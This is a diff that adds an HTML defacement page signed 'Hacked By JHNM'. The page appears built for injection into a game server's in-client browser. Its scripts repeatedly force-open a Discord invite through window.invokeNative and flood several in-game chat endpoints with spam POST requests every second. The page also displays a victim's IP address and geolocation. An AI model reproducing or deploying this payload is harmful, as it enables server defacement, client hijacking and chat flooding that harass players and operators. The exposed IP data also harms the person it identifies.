@@ -1,0 +1,200 @@
+<html lang="ar"><head><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>
+
+
+    <meta charset="UTF-8">
+    <title>JHNM</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #000000;
+            background-color: #000000;
+        }
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            user-select: none;
+        }
+        h1, h3 {
+            color: #ffffff;
+        }
+        .cmd-text-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .cmd-text {
+            color: rgb(139, 69, 19);
+            font-size: 17px;
+            font-family: Arial, sans-serif;
+            white-space: nowrap;
+            animation: scrollText 20s linear infinite;
+            -webkit-text-stroke: 1px white;
+        }
+        @keyframes scrollText {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        .json-data {
+            font-family: Arial, sans-serif;
+            color: rgb(139, 69, 19);
+            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
+            white-space: pre;
+        }
+        .animated-text {
+            animation: lightning 1s linear infinite;
+        }
+        @keyframes lightning {
+            0% { color: red; }
+            50% { color: black; }
+            100% { color: white; }
+        }
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            filter: blur(10px);
+        }
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+
+
+<p align="center">
+    <img border="0" src="https://files.catbox.moe/s0eu7t.png" width="auto" height="200">
+
+    </p><p align="center">
+        <font face="Courier" size="6" style="color: #000000;">
+            <span style="color: rgb(210, 105, 30);">Hacked By</span>
+            <span id="name" style="color: white;">[ JHNM، ]</span>
+        </font>
+    </p>
+
+    <p align="center">
+        <b><font face="Courier" color="#000000">
+            <a href="https://discord.gg/ay1" style="font-size: 24px; color: rgb(210, 105, 30); text-decoration: none;">Discord.gg/ay1</a>
+        </font></b>
+    </p>
+
+    <h3 class="animated-text" align="center">JHNM، fucked the server</h3>
+
+    <p id="ip-address">
+        <span style="color: rgb(255, 255, 255);">Your IP Address: </span>
+        <span id="ip-address-value" style="color: rgb(255, 255, 255); font-size: 17px;">77.137.70.106</span>
+    </p>
+
+    <h3 style="color: rgb(255, 255, 255); animation: flashing 1s infinite;">Your IP Info :</h3>
+    <pre id="ip-info" class="json-data">{
+  "ip": "77.137.70.106",
+  "city": "Bnei Brak",
+  "region": "Tel Aviv",
+  "country": "IL",
+  "loc": "32.0807,34.8338",
+  "org": "AS12849 Hot-Net internet services Ltd.",
+  "timezone": "Asia/Jerusalem",
+  "readme": "https://ipinfo.io/missingauth"
+}</pre>
+
+    <div class="cmd-text-container" style="top: -15px;">
+        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;"> You got hacked by cAsH،</div>
+    </div>
+
+    
+    <div id="video-bg">
+        <video autoplay="" loop="" muted="">
+            <source src="https://files.catbox.moe/mfl2zu.mp4" type="video/mp4"> 
+        </video>
+        <video autoplay="" loop="" muted="" style="position: fixed; top: 0; left: 0; z-index: -1; width: 100vw; height: 100vh; object-fit: cover;">
+            <source src="https://files.catbox.moe/mfl2zu.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    
+    <audio autoplay="" loop="">
+        <source src="https://files.catbox.moe/16ipvv.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <p align="center" style="color: red; font-size: 24px;">Oops, your server is down!</p>
+
+
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/ay1");
+window.invokeNative("openUrl", "https://discord.gg/ay1");
+}, 5000);
+</script>
+
+<script>
+setInterval(() => {
+    fetch("https://flix-scripts/chatResult", {
+        method: "POST",
+        headers: {
+            "Content-Type": "text/plain;charset=UTF-8"
+        },
+        body: JSON.stringify({ message: "JHNM & PWN -disc0rd.gg/ay1" })
+    });
+
+    fetch("https://easy-chat.com/o6ZbK5Ecp6", {
+        method: "POST",
+        headers: {
+            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
+        body: JSON.stringify({
+            message: ":7: pwn - discord.gg/ay1 :7:",
+            channel: "شات العام"
+        })
+    });
+
+    fetch("https://melix_chat/chatResult", {
+        method: "POST",
+        headers: {
+            "Content-Type": "text/plain;charset=UTF-8"
+        },
+        body: JSON.stringify({ message: ":6: JHNM & PWN -disc0rd.gg/ay1 :6:" })
+    });
+
+fetch("http://te-chat/chatResult", {
+  "headers": {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+  },
+  "referrer": "",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "{\"message\":\":6: JHNM & PWN -disc0rd.gg/ay1 :6:\"}",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+
+fetch("https://te-chat/chatResult", {
+  "headers": {
+    "accept": "*/*",
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+  },
+  "referrer": "",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "{\"message\":\":6: JHNM & PWN -disc0rd.gg/ay1 :6:\"}",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+
+}, 1000);
+</script>
+
+<veepn-intro-offer><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-intro-offer></body></html>
